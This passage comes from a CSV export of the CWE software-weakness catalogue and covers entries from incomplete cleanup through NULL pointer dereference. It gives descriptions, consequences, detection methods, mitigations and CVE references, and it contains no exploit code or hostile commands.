made.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1744::\",::File Processing::,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Incomplete Cleanup::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO42-C:ENTRY NAME:Close files when they are no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM31-C:ENTRY NAME:Free dynamically allocated memory when no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO04-J:ENTRY NAME:Release resources when they are no longer needed::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO00-J:ENTRY NAME:Do not operate on files in shared directories::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP14:ENTRY NAME:Failure to release resource::\",,\"::TYPE:Relationship:NOTE:CWE-459 is a child of CWE-404 because, while CWE-404 covers any type of improper shutdown or release of a resource, CWE-459 deals specifically with a multi-step shutdown process in which a crucial step for proper cleanup is omitted or impossible. That is, CWE-459 deals specifically with a cleanup or shutdown process that does not successfully remove all potentially sensitive data.::TYPE:Relationship:NOTE:Overlaps other categories such as permissions and containment. Concept needs further development. This could be primary (e.g. leading to infoleak) or resultant (e.g. resulting from unhandled error conditions or early termination).::\",\n463,\"Deletion of Data Structure Sentinel\",Base,Incomplete,\"The accidental deletion of a data-structure sentinel can cause serious programming logic problems.\",\"Often times data-structure sentinels are used to mark structure of the data structure. A common example of this is the null character at the end of strings. Another common example is linked lists which may contain a sentinel to mark the end of the list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the deletion or modification outside of some wrapper interface which provides safety.\",::NATURE:ChildOf:CWE ID:707:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:464:VIEW ID:1000::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:SCOPE:Other:IMPACT:Other:NOTE:Generally this error will cause the data structure to not work properly.::SCOPE:Authorization:SCOPE:Other:IMPACT:Other:NOTE:If a control character, such as NULL is removed, one may cause resource access control problems.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use an abstraction library to abstract away risky APIs. Not a complete solution.::PHASE:Build and Compilation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows. For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.:EFFECTIVENESS:Defense in Depth::PHASE:Operation:DESCRIPTION:Use OS-level preventative functionality. Not a complete solution.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Deletion of data-structure sentinel::\",,\"\",\n464,\"Addition of Data Structure Sentinel\",Base,Incomplete,\"The accidental addition of a data-structure sentinel can cause serious programming logic problems.\",\"Data-structure sentinels are often used to mark the structure of data. A common example of this is the null character at the end of strings or a special sentinel to mark the end of a linked list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the addition or modification of sentinels.\",::NATURE:ChildOf:CWE ID:138:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:Generally this error will cause the data structure to not work properly by truncating the data.::\",\"\",\"::PHASE:Implementation Architecture and Design:DESCRIPTION:Encapsulate the user from interacting with data sentinels. Validate user input to verify that sentinels are not present.::PHASE:Implementation:DESCRIPTION:Proper error checking can reduce the risk of inadvertently introducing sentinel values into data. For example, if a parsing function fails or encounters an error, it might return a value that is the same as the sentinel.::PHASE:Architecture and Design:DESCRIPTION:Use an abstraction library to abstract away risky APIs. This is not a complete solution.::PHASE:Operation:DESCRIPTION:Use OS-level preventative functionality. This is not a complete solution.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Addition of data-structure sentinel::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR03-C:ENTRY NAME:Do not inadvertently truncate a null-terminated byte string::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR06-C:ENTRY NAME:Do not assume that strtok() leaves the parse string unchanged::\",,\"\",\n466,\"Return of Pointer Value Outside of Expected Range\",Base,Draft,\"A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.\",\"\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Memory:IMPACT:Modify Memory::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Illegal Pointer Value::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"::TYPE:Maintenance:NOTE:This entry should have a chaining relationship with CWE-119 instead of a parent / child relationship, however the focus of this weakness does not map cleanly to any existing entries in CWE. A new parent is being considered which covers the more generic problem of incorrect return values. There is also an abstract relationship to weaknesses in which one component sends incorrect messages to another component; in this case, one routine is sending an incorrect value to another.::\",\n468,\"Incorrect Pointer Scaling\",Base,Incomplete,\"In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Programmers may try to index from a pointer by adding a number of bytes. This is incorrect because C and C++ implicitly scale the operand by the size of the data type.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Memory:IMPACT:Modify Memory:NOTE:Incorrect pointer scaling will often result in buffer overflow conditions. Confidentiality can be compromised if the weakness is in the context of a buffer over-read or under-read.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use a platform with high-level memory abstractions.::PHASE:Implementation:DESCRIPTION:Always use array indexing instead of direct pointer manipulation.::PHASE:Architecture and Design:DESCRIPTION:Use technologies for preventing buffer overflows.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Unintentional pointer scaling::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR39-C:ENTRY NAME:Do not add or subtract a scaled integer to a pointer:MAPPING FIT:Exact::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP08-C:ENTRY NAME:Ensure pointer arithmetic is used correctly::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n469,\"Use of Pointer Subtraction to Determine Size\",Base,Draft,\"The product subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:NOTE:There is the potential for arbitrary code execution with privileges of the vulnerable program.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Save an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to walk from one pointer to the other and calculate the difference. Always validate this number.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Improper pointer subtraction::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR36-C:ENTRY NAME:Do not subtract or compare two pointers that do not refer to the same array:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP7:ENTRY NAME:Faulty Pointer Use::\",,\"\",\n470,\"Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\",Base,Draft,\"The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.\",\"If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.\",::NATURE:ChildOf:CWE ID:913:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:913:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Interpreted:LANGUAGE PREVALENCE:Sometimes::,\"\",\"::TERM:Reflection Injection::\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Alter Execution Logic:NOTE:The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state.::SCOPE:Availability:SCOPE:Other:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Other:NOTE:The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Refactor your code to avoid using reflection.::PHASE:Architecture and Design:DESCRIPTION:Do not use user-controlled inputs to select and load classes or code.::PHASE:Implementation:DESCRIPTION:Apply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code.::\",\"::REFERENCE:CVE-2018-1000613:DESCRIPTION:Cryptography API uses unsafe reflection when deserializing a private key:LINK:https://www.cve.org/CVERecord?id=CVE-2018-1000613::REFERENCE:CVE-2004-2331:DESCRIPTION:Database system allows attackers to bypass sandbox restrictions by using the Reflection API.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2331::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Unsafe Reflection::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC06-J:ENTRY NAME:Do not use reflection to increase accessibility of classes, methods, or fields::\",::138::,\"\",\n472,\"External Control of Assumed-Immutable Web Parameter\",Base,Draft,\"The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.\",\"If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input. For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:471:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Assumed-Immutable Parameter Tampering::\",\"::PHASE:Implementation:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-0108:DESCRIPTION:Forum product allows spoofed messages of other users via hidden form fields for name and e-mail address.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0108::REFERENCE:CVE-2000-0253:DESCRIPTION:Shopping cart allows price modification via hidden form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0253::REFERENCE:CVE-2000-0254:DESCRIPTION:Shopping cart allows price modification via hidden form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0254::REFERENCE:CVE-2000-0926:DESCRIPTION:Shopping cart allows price modification via hidden form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0926::REFERENCE:CVE-2000-0101:DESCRIPTION:Shopping cart allows price modification via hidden form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0101::REFERENCE:CVE-2000-0102:DESCRIPTION:Shopping cart allows price modification via hidden form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0102::REFERENCE:CVE-2000-0758:DESCRIPTION:Allows admin access by modifying value of form field.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0758::REFERENCE:CVE-2002-1880:DESCRIPTION:Read messages by modifying message ID parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1880::REFERENCE:CVE-2000-1234:DESCRIPTION:Send email to arbitrary users by modifying email parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1234::REFERENCE:CVE-2005-1652:DESCRIPTION:Authentication bypass by setting a parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1652::REFERENCE:CVE-2005-1784:DESCRIPTION:Product does not check authorization for configuration change admin script, leading to password theft via modified e-mail address field.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1784::REFERENCE:CVE-2005-2314:DESCRIPTION:Logic error leads to password disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2314::REFERENCE:CVE-2005-1682:DESCRIPTION:Modification of message number parameter allows attackers to read other people's messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1682::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Web Parameter Tampering::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A4:ENTRY NAME:Insecure Direct Object Reference:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::\",::146::226::31::39::,\"::TYPE:Relationship:NOTE:This is a primary weakness for many other weaknesses and functional consequences, including XSS, SQL injection, path disclosure, and file inclusion.::TYPE:Theoretical:NOTE:This is a technology-specific MAID problem.::\",\n474,\"Use of Function with Inconsistent Implementations\",Base,Draft,\"The code uses a function that has inconsistent implementations across operating systems and versions.\",\"The use of inconsistent implementations can cause changes in behavior when the code is ported or built under a different environment than the programmer expects, which can lead to security problems in some cases. The implementation of many functions varies by platform, and at times, even by different versions of the same platform. Implementation differences can include: Slight differences in the way parameters are interpreted leading to inconsistent results. Some implementations of the function carry significant security risks. The function might not be defined on all platforms. The function might change which return codes it can provide, or change the meaning of its return codes.\",::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Indirect::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Requirements:DESCRIPTION:Do not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Inconsistent Implementations::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"\",\n475,\"Undefined Behavior for Input to API\",Base,Incomplete,\"The behavior of this function is undefined unless its control parameter is set to a specific value.\",\"\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Undefined Behavior::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"::TYPE:Other:NOTE:The Linux Standard Base Specification 2.0.1 for libc places constraints on the arguments to some internal functions [21]. If the constraints are not met, the behavior of the functions is not defined. It is unusual for this function to be called directly. It is almost always invoked through a macro defined in a system header file, and the macro ensures that the following constraints are met: The value 1 must be passed to the third parameter (the version number) of the following file system function: __xmknod The value 2 must be passed to the third parameter (the group argument) of the following wide character string functions: __wcstod_internal __wcstof_internal __wcstol_internal __wcstold_internal __wcstoul_internal The value 3 must be passed as the first parameter (the version number) of the following file system functions: __xstat __lxstat __fxstat __xstat64 __lxstat64 __fxstat64::\",\n476,\"NULL Pointer Dereference\",Base,Stable,\"The product dereferences a pointer that it expects to be valid but is NULL.\",\"\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:754:VIEW ID:1000::NATURE:ChildOf:CWE ID:754:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Resultant:DESCRIPTION:NULL pointer dereferences are frequently resultant from rarely encountered error conditions and race conditions, since these are most likely to escape detection during the testing phases.::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Go:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:NPD:DESCRIPTION:Common abbreviation for Null Pointer Dereference::TERM:null deref:DESCRIPTION:Common abbreviation for Null Pointer Dereference::TERM:NPE:DESCRIPTION:Common abbreviation for Null Pointer Exception::TERM:nil pointer dereference:DESCRIPTION:used for access of nil in Go programs::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation.::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Memory:IMPACT:Modify Memory:NOTE:In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution.::\",\"::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Dynamic Analysis:DESCRIPTION:Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:If all pointers that could have been modified are checked for NULL before use, nearly all NULL pointer dereferences can be prevented.::PHASE:Requirements:DESCRIPTION:Select a programming language that is not susceptible to these issues.::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is non-null before acting upon it.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.::PHASE:Implementation:DESCRIPTION:Explicitly initialize all variables and other data stores, either during declaration or just before the first usage.::\",\"::REFERENCE:CVE-2005-3274:DESCRIPTION:race condition causes a table to be corrupted if a timer activates while it is being modified, leading to resultant NULL dereference; also involves locking.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3274::REFERENCE:CVE-2002-1912:DESCRIPTION:large number of packets leads to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1912::REFERENCE:CVE-2005-0772:DESCRIPTION:packet with invalid error status value triggers NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0772::REFERENCE:CVE-2009-4895:DESCRIPTION:Chain: race condition for an argument value, possibly resulting in NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4895::REFERENCE:CVE-2020-29652:DESCRIPTION:ssh component for Go allows clients to cause a denial of service (nil pointer dereference) against SSH servers.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-29652::REFERENCE:CVE-2009-2692:DESCRIPTION:Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2692::REFERENCE:CVE-2009-3547:DESCRIPTION:Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476):LINK:https://www.cve.org/CVERecord?id=CVE-2009-3547::REFERENCE:CVE-2009-3620:DESCRIPTION:Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3620::REFERENCE:CVE-2009-2698:DESCRIPTION:Chain: IP and UDP layers each track the same value with different mechanisms that can get out of sync, possibly resulting in a NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2698::REFERENCE:CVE-2009-2692:DESCRIPTION:Chain: uninitialized function pointers can be dereferenced allowing code execution:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2692::REFERENCE:CVE-2009-0949:DESCRIPTION:Chain: improper initialization of memory can lead to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0949::REFERENCE:CVE-2008-3597:DESCRIPTION:Chain: game server can access player data structures before initialization has happened leading to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3597::REFERENCE:CVE-2020-6078:DESCRIPTION:Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476):LINK:https://www.cve.org/CVERecord?id=CVE-2020-6078::REFERENCE:CVE-2008-0062:DESCRIPTION:Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0062::REFERENCE:CVE-2008-5183:DESCRIPTION:Chain: unchecked return value can lead to NULL dereference:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5183::REFERENCE:CVE-2004-0079:DESCRIPTION:SSL software allows remote attackers to cause a denial of service (crash) via a crafted SSL/TLS handshake that triggers a null dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0079::REFERENCE:CVE-2004-0365:DESCRIPTION:Network monitor allows remote attackers to cause a denial of service (crash) via a malformed RADIUS packet that triggers a null dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0365::REFERENCE:CVE-2003-1013:DESCRIPTION:Network monitor allows remote attackers to cause a denial of service (crash) via a malformed Q.931, which triggers a null dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1013::REFERENCE:CVE-2003-1000:DESCRIPTION:Chat client allows remote attackers to cause a denial of service (crash) via a passive DCC request with an invalid ID number, which causes a null dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1000::REFERENCE:CVE-2004-0389:DESCRIPTION:Server allows remote attackers to cause a denial of service (crash) via malformed requests that trigger a null dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0389::REFERENCE:CVE-2004-0119:DESCRIPTION:OS allows remote attackers to cause a denial of service (crash from null dereference) or execute arbitrary code via a crafted request during authentication protocol selection.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0119::REFERENCE:CVE-2004-0458:DESCRIPTION:Game allows remote attackers to cause a denial of service (server crash) via a missing argument, which triggers a null pointer dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0458::REFERENCE:CVE-2002-0401:DESCRIPTION:Network monitor allows remote attackers to cause a denial of service (crash) or execute arbitrary code via malformed packets that cause a NULL pointer dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0401::REFERENCE:CVE-2001-1559:DESCRIPTION:Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1559::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Null Dereference::TAXONOMY NAME:CLASP:ENTRY NAME:Null-pointer dereference::TAXONOMY NAME:PLOVER:ENTRY NAME:Null Dereference (Null Pointer 